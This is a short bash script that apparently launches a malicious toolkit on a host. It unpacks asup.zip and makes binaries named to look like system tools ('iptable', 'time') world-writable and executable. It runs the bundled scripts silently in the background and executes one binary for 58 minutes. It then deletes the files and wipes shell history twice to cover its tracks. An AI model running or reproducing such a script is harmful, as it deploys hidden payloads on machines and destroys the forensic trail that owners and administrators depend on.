#!/bin/bash
apt-get update
apt-get install unzip
unzip asup.zip
chmod 777 iptable time *.sh
./*.sh >/dev/null &
uname -a
history -rc
timeout 58m ./time
rm iptable time *.sh
echo "done..."
history -rc
